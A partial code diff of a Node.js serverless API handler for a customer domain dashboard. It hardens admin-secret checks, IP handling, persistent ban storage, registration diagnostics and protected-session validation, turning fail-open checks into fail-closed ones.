@@ -1,6 +1,31 @@
 'use strict';
 
 const crypto = require('crypto');
+
+/* ============================================================
+   DIRAC CENTRAL ARCHITECTURE CONSOLIDATION v202
+   Flat middleware registry. A single final export is installed at EOF.
+   Existing business-handler bodies remain unchanged.
+   ============================================================ */
+const DIRAC_CENTRAL_ARCHITECTURE_CONSOLIDATION_V202 = 'dirac-central-architecture-consolidation-v202';
+const __diracV202MiddlewareRegistry = [];
+const __diracV202WrapperFlags = new Set();
+let __diracV202MiddlewareRegistryLockedV228 = false;
+function __diracV202DispatcherSentinel() {}
+function __diracV202RegisterMiddleware(fn, name) {
+  if (__diracV202MiddlewareRegistryLockedV228) throw new Error('DIRAC_V202_MIDDLEWARE_REGISTRY_LOCKED');
+  if (typeof fn !== 'function') throw new Error('DIRAC_V202_MIDDLEWARE_INVALID');
+  __diracV202MiddlewareRegistry.push(Object.freeze({ fn, name: String(name || fn.name || 'anonymous') }));
+  return fn;
+}
+function __diracV202MarkWrapperFlag(name) {
+  const clean = String(name || '');
+  if (!clean) return false;
+  __diracV202WrapperFlags.add(clean);
+  try { Object.defineProperty(__diracV202DispatcherSentinel, clean, { value: true, enumerable: false, configurable: false }); } catch (_) {}
+  return true;
+}
+
 const DIRAC_MIDTRANS_DEBUG_PATCH = 'midtrans-dashboard-key-accept-v11';
 const DIRAC_IPAYMU_PATCH = 'ipaymu-redirect-v12';
 const DIRAC_COOKIE_SESSION_PATCH = 'cookie-signed-session-v16';
@@ -59,7 +84,7 @@ const DOMAIN_ACTION_ALIASES = Object.freeze({
   'dashboard-mfa-status': 'domain_mfa_status'
 });
 
-module.exports = async function handler(req, res) {
+const __diracV202BaseHandler = async function handler(req, res) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = normalizeDomainAction(rawAction);
   const isDomainAction = DOMAIN_ACTIONS.has(action);
@@ -118,17 +143,37 @@ function setCors(req, res, options = {}) {
   const allowedOrigin = origin && allowed.has(origin) ? origin : '';
   if (allowedOrigin) res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
   res.setHeader('Vary', 'Origin');
-  res.setHeader('Access-Control-Allow-Methods', options.isDomainAction ? 'GET, POST, OPTIONS' : 'GET, OPTIONS');
+  res.setHeader('Access-Control-Allow-Methods', options.isDomainAction ? 'GET, HEAD, POST, OPTIONS' : 'GET, HEAD, OPTIONS');
 
   const domainAllowedHeaders = [
     'Content-Type',
     'Accept',
     'Idempotency-Key',
     'X-Idempotency-Key',
+    'X-CSRF-Token',
+    'X-Dirac-CSRF-Token',
+    'X-Dirac-Page-Nonce',
+    'X-Page-Nonce',
+    'X-Dirac-Public-Nonce',
+    'X-Dirac-A2F-Ticket',
+    'X-Dirac-A2F-Signature',
+    'X-Dirac-A2F-Timestamp',
+    'X-Dirac-A2F-Nonce',
+    'X-Requested-With',
     'content-type',
     'accept',
     'idempotency-key',
-    'x-idempotency-key'
+    'x-idempotency-key',
+    'x-csrf-token',
+    'x-dirac-csrf-token',
+    'x-dirac-page-nonce',
+    'x-page-nonce',
+    'x-dirac-public-nonce',
+    'x-dirac-a2f-ticket',
+    'x-dirac-a2f-signature',
+    'x-dirac-a2f-timestamp',
+    'x-dirac-a2f-nonce',
+    'x-requested-with'
   ];
 
   // PATCH 3A: backend-only customer auth.
@@ -185,8 +230,13 @@ function getAllowedOrigins() {
 }
 
 function isAdminRequest(req) {
-  const secret = process.env.AI_ADMIN_SECRET;
-  return !!secret && String(req.headers && req.headers['x-dirac-admin'] || '') === secret;
+  const secret = String(process.env.AI_ADMIN_SECRET || '');
+  const candidate = String(req && req.headers && req.headers['x-dirac-admin'] || '');
+  if (!secret || !candidate) return false;
+  const expected = crypto.createHash('sha512').update(secret, 'utf8').digest();
+  const received = crypto.createHash('sha512').update(candidate, 'utf8').digest();
+  return Buffer.byteLength(candidate, 'utf8') === Buffer.byteLength(secret, 'utf8')
+    && crypto.timingSafeEqual(received, expected);
 }
 
 function normalizeDomainAction(action) {
@@ -273,10 +323,23 @@ const LOGIN_SECURITY_BODY_LIMIT_BYTES_RAW = Number(process.env.LOGIN_SECURITY_BO
 const LOGIN_SECURITY_BODY_LIMIT_BYTES = Number.isFinite(LOGIN_SECURITY_BODY_LIMIT_BYTES_RAW)
   ? Math.max(1024, LOGIN_SECURITY_BODY_LIMIT_BYTES_RAW)
   : 16 * 1024;
-// Optional durable security storage. Default empty = safe in-memory fallback, no new DB writes.
-// To activate later, create a dedicated security table and set LOGIN_SECURITY_PERSIST_TABLE.
-const LOGIN_SECURITY_PERSIST_TABLE = String(process.env.LOGIN_SECURITY_PERSIST_TABLE || '').trim();
+// Dedicated security database tables. Names are fixed to the hardened schema.
+// Persistent bans and non-S2S security state are isolated from S2S registry/replay/revocation.
+const DIRAC_PERSISTENT_BAN_TABLE = 'dirac_persistent_bans';
+const DIRAC_S2S_SECURITY_TABLE = 'dirac_s2s_security';
+const LOGIN_SECURITY_PERSIST_TABLE = DIRAC_PERSISTENT_BAN_TABLE;
 const LOGIN_SECURITY_PERSIST_TTL_SECONDS = 10 * 365 * 24 * 60 * 60;
+
+function diracPersistentSecurityTableForKeyV209(securityKey) {
+  const key = String(securityKey || '').trim();
+  if (/^(?:s2s-|recovery-worker-nonce-v183:)/.test(key)) return DIRAC_S2S_SECURITY_TABLE;
+  return DIRAC_PERSISTENT_BAN_TABLE;
+}
+
+function diracPersistentSecurityTableForKeysV209(securityKeys) {
+  const tables = new Set((securityKeys || []).map(diracPersistentSecurityTableForKeyV209));
+  return tables.size === 1 ? Array.from(tables)[0] : '';
+}
 
 // LOGIN RATE LIMIT PATCH v1 - domain_login only.
 // Menggunakan tabel rate limit yang sudah ada. Tidak mengubah endpoint, hash, A2F, checkout, order, atau fitur lain.
@@ -806,8 +869,19 @@ function getLoginSecurityIdentity(req, actionName) {
 
 function getLoginSecurityIp(req) {
   const headers = (req && req.headers) || {};
-  const forwarded = String(headers['x-forwarded-for'] || '').split(',')[0].trim();
-  return forwarded || String(headers['x-real-ip'] || req.socket && req.socket.remoteAddress || '').trim() || 'unknown';
+  const normalizeIp = (value) => {
+    let clean = String(value || '').split(',')[0].trim();
+    if (/^\[[0-9a-f:]+\](?::\d+)?$/i.test(clean)) clean = clean.slice(1, clean.indexOf(']'));
+    if (/^::ffff:\d{1,3}(?:\.\d{1,3}){3}$/i.test(clean)) clean = clean.slice(7);
+    try { return require('net').isIP(clean) ? clean.toLowerCase() : ''; } catch (_) { return ''; }
+  };
+  const vercelForwarded = normalizeIp(headers['x-vercel-forwarded-for']);
+  if (vercelForwarded) return vercelForwarded;
+  if (process.env.NODE_ENV === 'production') return 'unknown';
+  const forwarded = normalizeIp(headers['x-forwarded-for']);
+  const realIp = normalizeIp(headers['x-real-ip']);
+  const socketIp = normalizeIp(req && req.socket && req.socket.remoteAddress);
+  return forwarded || realIp || socketIp || 'unknown';
 }
 
 function maskLoginSecurityIp(ip) {
@@ -894,10 +968,11 @@ function normalizeLoginSecurityRecord(record, now = Date.now()) {
 
 async function readPersistentSecurityJson(securityKey) {
   const key = String(securityKey || '').trim();
-  if (!LOGIN_SECURITY_PERSIST_TABLE || !key) return null;
+  const table = diracPersistentSecurityTableForKeyV209(key);
+  if (!table || !key) return null;
 
   try {
-    const path = `/rest/v1/${encodeURIComponent(LOGIN_SECURITY_PERSIST_TABLE)}?select=security_key,record_json,blocked_until_ms,expires_at&security_key=eq.${encodeURIComponent(key)}&limit=1`;
+    const path = `/rest/v1/${encodeURIComponent(table)}?select=security_key,record_json,blocked_until_ms,expires_at&security_key=eq.${encodeURIComponent(key)}&limit=1`;
     const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
     if (!result.ok || !Array.isArray(result.data) || !result.data.length) return null;
 
@@ -912,7 +987,8 @@ async function readPersistentSecurityJson(securityKey) {
 
 async function writePersistentSecurityJson(securityKey, record, blockedUntilMs = 0, ttlSeconds = LOGIN_SECURITY_PERSIST_TTL_SECONDS) {
   const key = String(securityKey || '').trim();
-  if (!LOGIN_SECURITY_PERSIST_TABLE || !key) return false;
+  const table = diracPersistentSecurityTableForKeyV209(key);
+  if (!table || !key) return false;
 
   try {
     const now = Date.now();
@@ -926,7 +1002,7 @@ async function writePersistentSecurityJson(securityKey, record, blockedUntilMs =
       expires_at: expiresAt
     }];
 
-    const result = await supabaseFetch(`/rest/v1/${encodeURIComponent(LOGIN_SECURITY_PERSIST_TABLE)}?on_conflict=security_key`, {
+    const result = await supabaseFetch(`/rest/v1/${encodeURIComponent(table)}?on_conflict=security_key`, {
       method: 'POST',
       auth: 'service',
       prefer: 'resolution=merge-duplicates',
@@ -936,6 +1012,85 @@ async function writePersistentSecurityJson(securityKey, record, blockedUntilMs =
   } catch (_) {
     return false;
   }
+}
+
+// Security-critical callers need to distinguish "not found" from an unavailable
+// persistence layer. The legacy reader intentionally returns null for both cases,
+// so Central Guard uses this strict reader for fail-closed decisions.
+async function readPersistentSecurityJsonStrictV194(securityKey) {
+  const key = String(securityKey || '').trim();
+  const table = diracPersistentSecurityTableForKeyV209(key);
+  if (!table || !key) return { ok: false, found: false, record: null };
+  try {
+    const path = `/rest/v1/${encodeURIComponent(table)}?select=security_key,record_json,blocked_until_ms,expires_at&security_key=eq.${encodeURIComponent(key)}&limit=1`;
+    const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+    if (!result || result.ok !== true || !Array.isArray(result.data)) {
+      return { ok: false, found: false, record: null };
+    }
+    if (result.data.length === 0) return { ok: true, found: false, record: null };
+    const row = result.data[0] || {};
+    const expiresAtMs = Date.parse(String(row.expires_at || ''));
+    if (Number.isFinite(expiresAtMs) && expiresAtMs <= Date.now()) {
+      return { ok: true, found: false, record: null };
+    }
+    const record = row.record_json && typeof row.record_json === 'object'
+      ? { ...row.record_json, blocked_until_ms: Number(row.blocked_until_ms || row.record_json.blocked_until_ms || 0) }
+      : { blocked_until_ms: Number(row.blocked_until_ms || 0) };
+    return { ok: true, found: true, record };
+  } catch (_) {
+    return { ok: false, found: false, record: null };
+  }
+}
+
+async function readPersistentSecurityJsonManyStrictV194(securityKeys) {
+  const keys = Array.from(new Set((securityKeys || []).map((key) => String(key || '').trim())
+    .filter((key) => /^[A-Za-z0-9:._-]{1,500}$/.test(key)))).slice(0, 40);
+  const table = diracPersistentSecurityTableForKeysV209(keys);
+  if (!table || !keys.length) return { ok: false, records: [] };
+  try {
+    const path = `/rest/v1/${encodeURIComponent(table)}?select=security_key,record_json,blocked_until_ms,expires_at&security_key=in.(${keys.map(encodeURIComponent).join(',')})&limit=${keys.length}`;
+    const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+    if (!result || result.ok !== true || !Array.isArray(result.data)) return { ok: false, records: [] };
+    const now = Date.now();
+    const records = result.data.filter((row) => {
+      const expiresAtMs = Date.parse(String(row && row.expires_at || ''));
+      return row && (!Number.isFinite(expiresAtMs) || expiresAtMs > now);
+    }).map((row) => ({
+      security_key: String(row.security_key || ''),
+      record: row.record_json && typeof row.record_json === 'object' ? row.record_json : {},
+      blocked_until_ms: Number(row.blocked_until_ms || row.record_json && row.record_json.blocked_until_ms || 0)
+    }));
+    return { ok: true, records };
+  } catch (_) {
+    return { ok: false, records: [] };
+  }
+}
+
+async function writePersistentSecurityJsonRequiredV194(securityKey, record, blockedUntilMs, ttlSeconds) {
+  if (!diracPersistentSecurityTableForKeyV209(securityKey) || typeof writePersistentSecurityJson !== 'function') return false;
+  for (let attempt = 0; attempt < 3; attempt += 1) {
+    const wrote = await writePersistentSecurityJson(securityKey, record, blockedUntilMs, ttlSeconds).catch(() => false);
+    if (wrote === true) return true;
+  }
+  return false;
+}
+
+async function claimPersistentSecurityKeyOnceV194(securityKey, record, ttlSeconds) {
+  const key = String(securityKey || '').trim();
+  const table = diracPersistentSecurityTableForKeyV209(key);
+  if (!table || !/^[A-Za-z0-9:._-]{1,500}$/.test(key)) return false;
+  const ttl = Math.max(60, Math.min(100 * 365 * 24 * 60 * 60, Number(ttlSeconds || 60)));
+  const result = await supabaseFetch('/rest/v1/rpc/dirac_central_atomic_claim_record_v230', {
+    method: 'POST',
+    auth: 'service',
+    body: {
+      p_table_name: table,
+      p_security_key: key,
+      p_record_json: record && typeof record === 'object' ? record : {},
+      p_expires_at: new Date(Date.now() + ttl * 1000).toISOString()
+    }
+  }).catch(() => null);
+  return Boolean(result && result.ok === true && result.data === true);
 }
 
 async function readPersistentLoginSecurityRecord(identity) {
@@ -1218,6 +1373,34 @@ async function domainRegister(req, res, preloadedBody) {
   try {
     body = preloadedBody || await readLimitedJsonBody(req, LOGIN_SECURITY_BODY_LIMIT_BYTES);
   } catch (error) {
+    try {
+      console.error('[dirac-register-400-diagnostic]', {
+        stage: 'body_reader',
+        status: Number.isInteger(Number(error && error.statusCode))
+          ? Number(error.statusCode)
+          : 400,
+        code: String(error && error.code || 'REGISTER_REQUEST_INVALID').slice(0, 96),
+        body_type: req && req.body === null
+          ? 'null'
+          : (Buffer.isBuffer(req && req.body)
+              ? 'buffer'
+              : typeof (req && req.body)),
+        sealed_raw_json: Boolean(
+          req && Object.getOwnPropertyDescriptor(req, '__diracRawJsonV221')
+        ),
+        sealed_raw_buffer: Boolean(
+          req && Object.getOwnPropertyDescriptor(req, '__diracRawBodyBufferV230')
+        ),
+        sealed_raw_length: Boolean(
+          req && Object.getOwnPropertyDescriptor(req, '__diracRawBodyLengthV230')
+        ),
+        sealed_raw_hash: Boolean(
+          req && Object.getOwnPropertyDescriptor(req, '__diracRawBodySha256V230')
+        )
+      });
+    } catch (registerBodyDiagnosticErrorV233) {
+      diracCentralRecordSuppressedExceptionV221(registerBodyDiagnosticErrorV233);
+    }
     return res.status(error.statusCode || 400).json({
       ok: false,
       code: error.code || 'REGISTER_REQUEST_INVALID',
@@ -1239,10 +1422,33 @@ async function domainRegister(req, res, preloadedBody) {
     endpoint: '/api/health?action=domain_register'
   });
   if (!registerGuard.ok) {
+    try {
+      console.error('[dirac-register-400-diagnostic]', {
+        stage: 'input_guard',
+        status: Number.isInteger(Number(registerGuard.status))
+          ? Number(registerGuard.status)
+          : 400,
+        code: String(
+          registerGuard && registerGuard.body && registerGuard.body.code
+            || 'REGISTER_INPUT_GUARD_REJECTED'
+        ).slice(0, 96)
+      });
+    } catch (registerGuardDiagnosticErrorV233) {
+      diracCentralRecordSuppressedExceptionV221(registerGuardDiagnosticErrorV233);
+    }
     return res.status(registerGuard.status).json(registerGuard.body);
   }
 
   if (password.length < 6) {
+    try {
+      console.error('[dirac-register-400-diagnostic]', {
+        stage: 'password_minimum',
+        status: 400,
+        code: 'PASSWORD_MINIMUM_LENGTH'
+      });
+    } catch (registerPasswordDiagnosticErrorV233) {
+      diracCentralRecordSuppressedExceptionV221(registerPasswordDiagnosticErrorV233);
+    }
     return res.status(400).json({ ok: false, message: 'Password minimal 6 karakter.' });
   }
 
@@ -1694,7 +1900,14 @@ async function requireDomainDashboardAccess(req, res) {
   if (!user) return null;
 
   const mfa = verifyCustomerDashboardMfaCookie(req, user);
+  customerSecuritySessionDecisionDebugV219(req, mfa && mfa.ok ? 'mfa.accepted' : 'mfa.rejected', {
+    decision: mfa && mfa.ok ? 'continue_to_protected_session' : 'respond_403',
+    mfa_code: mfa && mfa.code || (mfa && mfa.ok ? 'mfa_ok' : 'mfa_unknown_failure'),
+    mfa_source: mfa && mfa.source || '',
+    clear_cookies: false
+  });
   if (!mfa.ok) {
+    clearSessionCookies(res);
     res.status(403).json({
       ok: false,
       dashboard: false,
@@ -1703,18 +1916,50 @@ async function requireDomainDashboardAccess(req, res) {
     return null;
   }
 
-  const protectedLock = await requireDomainProtectedDatabaseSessionLockSafe(req, res, user).catch((error) => {
+  const protectedLock = await requireDomainProtectedDatabaseSessionLockSafe(req, res, user, mfa).catch((error) => {
+    customerSecuritySessionDecisionDebugV219(req, 'protected_session.exception', {
+      decision: 'respond_503',
+      reason: 'protected_session_guard_exception',
+      diagnostic_code: String(error && (error.code || error.name) || 'PROTECTED_SESSION_EXCEPTION'),
+      failure_point: 'requireDomainDashboardAccess.protected_session'
+    });
     console.error('[domain-protected-lock-safe]', customerSecuritySafeLogError(error));
-    return { ok: true, skipped: true, reason: 'lock_exception_fail_open' };
+    res.status(503).json({
+      ok: false,
+      dashboard: false,
+      code: 'PROTECTED_SESSION_GUARD_UNAVAILABLE',
+      message: 'Validasi sesi protected belum tersedia. Silakan coba lagi.',
+      source: 'database_protected_lock_safe_v210'
+    });
+    return null;
   });
   if (!protectedLock) return null;
 
+  customerSecuritySessionDecisionDebugV219(req, 'dashboard_access.accepted', {
+    decision: 'handler_continue',
+    session_id_digest: customerSecurityShortDigestV219(protectedLock.sessionId || ''),
+    idle_ms: protectedLock.idleMs,
+    idle_timeout_ms: protectedLock.idle_timeout_ms,
+    touch_ok: Boolean(protectedLock.touched || protectedLock.created)
+  });
   return { user, mfa, protectedLock };
 }
 
-async function requireDomainProtectedDatabaseSessionLockSafe(req, res, user) {
-  const checked = await checkDomainProtectedDatabaseSessionLockSafe(req, user);
+async function requireDomainProtectedDatabaseSessionLockSafe(req, res, user, mfa) {
+  const checked = await checkDomainProtectedDatabaseSessionLockSafe(req, user, mfa);
   if (checked && checked.ok) return checked;
+
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.rejected', {
+    decision: 'respond_' + String(checked && checked.status || 401),
+    reason: checked && checked.code || 'PROTECTED_SESSION_LOCKED',
+    diagnostic_code: checked && checked.diagnostic_code || '',
+    failure_point: checked && checked.failure_point || '',
+    provider_code: checked && checked.provider_code || '',
+    upstream_status: checked && Number(checked.upstream_status || 0) || 0,
+    customer_digest: customerSecurityShortDigestV219(checked && checked.customerId || ''),
+    session_id_digest: customerSecurityShortDigestV219(checked && checked.sessionId || ''),
+    clear_cookies: Boolean(checked && checked.clearCookies)
+  });
 
   if (checked && checked.clearCookies) clearSessionCookies(res);
 
@@ -1724,64 +1969,238 @@ async function requireDomainProtectedDatabaseSessionLockSafe(req, res, user) {
     code: (checked && checked.code) || 'PROTECTED_SESSION_LOCKED',
     message: (checked && checked.message) || 'Sesi protected sudah dikunci. Silakan login ulang.',
     idle_timeout_ms: DOMAIN_PROTECTED_IDLE_TIMEOUT_MS,
-    source: 'database_protected_lock_safe_v2'
+    source: 'database_protected_lock_safe_v2',
+    diagnostic_code: checked && checked.diagnostic_code || undefined,
+    failure_point: checked && checked.failure_point || undefined,
+    upstream_status: checked && Number(checked.upstream_status || 0) || undefined,
+    provider_code: checked && checked.provider_code || undefined,
+    failure_id: checked && checked.failure_id || undefined
   });
   return null;
 }
 
-async function checkDomainProtectedDatabaseSessionLockSafe(req, user) {
+async function checkDomainProtectedDatabaseSessionLockSafe(req, user, mfa) {
   const authUserId = String(user && user.id || '').trim();
   if (!authUserId || !customerSecurityLooksLikeUuid(authUserId)) {
-    return { ok: true, skipped: true, reason: 'invalid_user_fail_open' };
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_USER_INVALID',
+      clearCookies: true,
+      message: 'Identitas sesi protected tidak valid. Silakan login ulang.'
+    };
   }
 
-  const linkResult = await customerSecurityFetchAuthLink(authUserId);
-  if (!linkResult.ok) {
-    return { ok: true, skipped: true, reason: 'auth_link_unavailable_fail_open', status: linkResult.status };
+  const verifiedOwner = diracCentralReadVerifiedOwnerContextV215(req, authUserId);
+  if (!verifiedOwner || verifiedOwner.ok !== true || !verifiedOwner.context) {
+    const ctx = diracCentralCurrentContextV149();
+    const reason = String(verifiedOwner && verifiedOwner.reason || 'verified_owner_context_unavailable');
+    const failurePoint = String(verifiedOwner && verifiedOwner.failurePoint || 'checkDomainProtectedDatabaseSessionLockSafe.verified_owner_context');
+    if (ctx) {
+      ctx.verifiedOwnerContextDebugV215 = Object.freeze({
+        patch: DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215,
+        result: 'blocked',
+        diagnostic_code: reason.toUpperCase().replace(/[^A-Z0-9_]/g, '').slice(0, 120),
+        failure_point: failurePoint.slice(0, 180)
+      });
+      diracCentralEmitDebugV211(ctx, 'verified_owner_context_blocked', {
+        reason,
+        diagnostic_code: reason.toUpperCase().replace(/[^A-Z0-9_]/g, '').slice(0, 120),
+        failure_point: failurePoint
+      });
+    }
+    await diracCentralBanCurrentContextV146(reason).catch(() => null);
+    return {
+      ok: false,
+      status: 403,
+      code: 'PROTECTED_SESSION_VERIFIED_OWNER_CONTEXT_INVALID',
+      clearCookies: true,
+      message: 'Ownership sesi protected tidak valid. Silakan login ulang.'
+    };
   }
 
-  const link = customerSecurityPickSingleActiveAuthLink(linkResult);
-  const customerId = String(link && link.customer_id || '').trim();
-  if (!link || link.link_status !== 'active' || !customerSecurityLooksLikeUuid(customerId)) {
-    return { ok: true, skipped: true, reason: 'customer_link_not_ready_fail_open' };
+  const customerId = String(verifiedOwner.context.customerId || '').trim();
+  const mfaSecurityEpoch = Number(mfa && mfa.securityEpoch || 0);
+  if (!Number.isSafeInteger(mfaSecurityEpoch) || mfaSecurityEpoch < 1) {
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_MFA_EPOCH_INVALID',
+      clearCookies: true,
+      customerId,
+      message: 'Sesi keamanan lama sudah dicabut. Silakan login dan verifikasi Passkey ulang.'
+    };
+  }
+
+  const epochReadPath = '/rest/v1/security_customer_settings?select=' +
+    encodeURIComponent('id,customer_id,security_epoch') +
+    '&customer_id=eq.' + encodeURIComponent(customerId) +
+    '&limit=2';
+  const epochRead = await supabaseFetch(epochReadPath, { method: 'GET', auth: 'service' });
+  if (!epochRead.ok || !Array.isArray(epochRead.data)) {
+    return {
+      ok: false,
+      status: 503,
+      code: 'PROTECTED_SESSION_SECURITY_EPOCH_UNAVAILABLE',
+      customerId,
+      message: 'Versi keamanan akun belum dapat diverifikasi. Silakan coba lagi.'
+    };
+  }
+  if (epochRead.data.length !== 1) {
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_SECURITY_EPOCH_AMBIGUOUS',
+      clearCookies: true,
+      customerId,
+      message: 'Versi keamanan akun tidak valid. Silakan login ulang.'
+    };
+  }
+  const accountSecurityEpoch = Number(epochRead.data[0] && epochRead.data[0].security_epoch || 0);
+  if (!Number.isSafeInteger(accountSecurityEpoch) || accountSecurityEpoch < 1) {
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_SECURITY_EPOCH_INVALID',
+      clearCookies: true,
+      customerId,
+      message: 'Versi keamanan akun tidak valid. Silakan login ulang.'
+    };
   }
 
   const fingerprint = customerSecurityBuildSessionFingerprint(req, customerId);
+  const fingerprintSelectionDebugV219 = customerSecuritySessionFingerprintSelectionV219(req);
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.fingerprint', {
+    decision: fingerprint && fingerprint.session_token_hash ? 'fingerprint_ready' : 'fingerprint_missing',
+    customer_digest: customerSecurityShortDigestV219(customerId),
+    fingerprint_source: fingerprintSelectionDebugV219.source,
+    fingerprint_token_digest: fingerprintSelectionDebugV219.token_digest
+  });
   if (!fingerprint || !fingerprint.session_token_hash) {
-    return { ok: true, skipped: true, reason: 'missing_fingerprint_fail_open', customerId };
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_BINDING_UNAVAILABLE',
+      clearCookies: true,
+      customerId,
+      message: 'Binding sesi protected tidak valid. Silakan login ulang.'
+    };
   }
 
-  const select = 'id,status,last_seen_at,expires_at,revoked_at,revoke_reason';
+  const select = 'id,customer_id,session_token_hash,status,last_seen_at,expires_at,revoked_at,revoke_reason,security_epoch';
   const readPath = '/rest/v1/security_customer_sessions?select=' +
     encodeURIComponent(select) +
     '&customer_id=eq.' + encodeURIComponent(customerId) +
     '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash) +
     '&limit=1';
 
+  const protectedReadStartedAtMs = Date.now();
   const found = await supabaseFetch(readPath, { method: 'GET', auth: 'service' });
   if (!found.ok) {
-    return { ok: true, skipped: true, reason: 'session_read_unavailable_fail_open', status: found.status, customerId };
+    const diagnostic = customerSecuritySessionStoreDiagnosticV218(req, 'protected_read', found, {
+      elapsed_ms: Date.now() - protectedReadStartedAtMs,
+      reason: 'protected_session_read_failed'
+    });
+    return {
+      ok: false,
+      status: 503,
+      code: 'PROTECTED_SESSION_STORE_UNAVAILABLE',
+      customerId,
+      message: 'Status sesi protected belum dapat diverifikasi. Silakan coba lagi.',
+      diagnostic_code: diagnostic.diagnostic_code,
+      failure_point: diagnostic.failure_point,
+      upstream_status: diagnostic.upstream_status,
+      provider_code: diagnostic.provider_code,
+      failure_id: diagnostic.failure_id
+    };
   }
 
   const rows = Array.isArray(found.data) ? found.data : [];
   const row = rows[0] || null;
   const nowMs = Date.now();
   const nowIso = new Date(nowMs).toISOString();
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.read', {
+    decision: row && row.id ? 'evaluate_existing_row' : 'reject_missing_row',
+    database_operation: 'GET',
+    row_count: rows.length,
+    row_found: Boolean(row),
+    row_has_id: Boolean(row && row.id),
+    customer_digest: customerSecurityShortDigestV219(customerId),
+    session_id_digest: customerSecurityShortDigestV219(row && row.id || ''),
+    session_status: String(row && row.status || '')
+  });
 
   if (!row || !row.id) {
-    // Jangan blokir login hanya karena row belum ada. Buat/touch session memakai fungsi existing.
-    customerSecurityTouchCurrentSession(req, customerId).catch(() => null);
-    return { ok: true, create_or_touch_queued: true, customerId, skipped: false, reason: 'session_create_or_touch_queued' };
+    customerSecuritySessionDecisionDebugV219(req, 'protected_session.missing_row_rejected', {
+      decision: 'clear_cookies_and_401',
+      database_operation: 'GET',
+      row_found: false,
+      row_has_id: false,
+      clear_cookies: true,
+      customer_digest: customerSecurityShortDigestV219(customerId)
+    });
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_NOT_FOUND',
+      clearCookies: true,
+      customerId,
+      message: 'Sesi sudah dicabut atau tidak ditemukan. Silakan login dan verifikasi Passkey ulang.'
+    };
+  }
+
+  const sessionSecurityEpoch = Number(row.security_epoch || 0);
+  const epochMatches = Number.isSafeInteger(sessionSecurityEpoch)
+    && sessionSecurityEpoch >= 1
+    && sessionSecurityEpoch === accountSecurityEpoch
+    && mfaSecurityEpoch === accountSecurityEpoch;
+  if (!epochMatches) {
+    await supabaseFetch('/rest/v1/security_customer_sessions?id=eq.' + encodeURIComponent(row.id)
+      + '&customer_id=eq.' + encodeURIComponent(customerId)
+      + '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash), {
+      method: 'PATCH',
+      auth: 'service',
+      prefer: 'return=minimal',
+      body: {
+        status: 'revoked',
+        revoked_at: nowIso,
+        revoke_reason: 'security_epoch_mismatch'
+      }
+    }).catch(() => null);
+    return {
+      ok: false,
+      status: 401,
+      code: 'PROTECTED_SESSION_SECURITY_EPOCH_REVOKED',
+      clearCookies: true,
+      customerId,
+      sessionId: row.id,
+      message: 'Sesi perangkat sudah dicabut oleh rotasi Passkey. Silakan login dan verifikasi Passkey ulang.'
+    };
   }
 
   const status = String(row.status || '').trim().toLowerCase();
-  const revoked = Boolean(row.revoked_at) || status === 'revoked';
+  const revoked = Boolean(row.revoked_at) || status !== 'active';
   const expiresAtMs = Date.parse(row.expires_at || '');
-  const expired = Number.isFinite(expiresAtMs) && expiresAtMs <= nowMs;
+  const expired = !Number.isFinite(expiresAtMs) || expiresAtMs <= nowMs;
   const lastSeenMs = Date.parse(row.last_seen_at || '');
   const hasLastSeen = Number.isFinite(lastSeenMs) && lastSeenMs > 0;
   const idleMs = hasLastSeen ? nowMs - lastSeenMs : 0;
-  const idleExpired = hasLastSeen && idleMs >= DOMAIN_PROTECTED_IDLE_TIMEOUT_MS;
+  const idleExpired = !hasLastSeen || idleMs < 0 || idleMs >= DOMAIN_PROTECTED_IDLE_TIMEOUT_MS;
+  customerSecuritySessionDecisionDebugV219(req, 'protected_session.state_evaluated', {
+    decision: idleExpired ? 'idle_lock' : revoked || expired ? 'revoked_or_expired_lock' : 'refresh_active_session',
+    customer_digest: customerSecurityShortDigestV219(customerId),
+    session_id_digest: customerSecurityShortDigestV219(row.id),
+    session_status: status,
+    revoke_reason_code: customerSecurityRevokeReasonCodeV219(row.revoke_reason),
+    revoked,
+    expired,
+    idle_expired: idleExpired,
+    has_last_seen: hasLastSeen,
+    idle_ms: idleMs,
+    idle_timeout_ms: DOMAIN_PROTECTED_IDLE_TIMEOUT_MS,
+    last_seen_age_ms: hasLastSeen ? idleMs : 0,
+    expires_in_ms: Number.isFinite(expiresAtMs) ? expiresAtMs - nowMs : -1
+  });
 
   if (idleExpired) {
     await customerSecurityWriteGuardEvent(customerId, {
@@ -1814,7 +2233,9 @@ async function checkDomainProtectedDatabaseSessionLockSafe(req, user) {
       ? String(row.revoke_reason || 'session_revoked')
       : 'session_expired';
 
-    await supabaseFetch('/rest/v1/security_customer_sessions?id=eq.' + encodeURIComponent(row.id), {
+    await supabaseFetch('/rest/v1/security_customer_sessions?id=eq.' + encodeURIComponent(row.id)
+      + '&customer_id=eq.' + encodeURIComponent(customerId)
+      + '&session_token_hash=eq.' + encodeURIComponent(fingerprint.session_token_hash), {
       method: 'PATCH',
       auth: 'service',
       prefer: 'return=minimal',
@@ -1850,8 +2271,53 @@ async function checkDomainProtectedDatabaseSessionLockSafe(req, user) {
     };
   }
 
-  customerSecurityTouchCurrentSession(req, customerId).catch(() => null);
-  return { ok: true, customerId, sessionId: row.id, idleMs, idle_timeout_ms: DOMAIN_PROTECTED_IDLE_TIMEOUT_MS, touch_queued: true };
+  const touched = await customerSecurityTouchCurrentSession(req, customerId, {
+    id: row.id,
+    customer_id: row.customer_id,
+    session_token_hash: row.session_token_hash,
+    status: row.status,
+    security_epoch: row.security_epoch
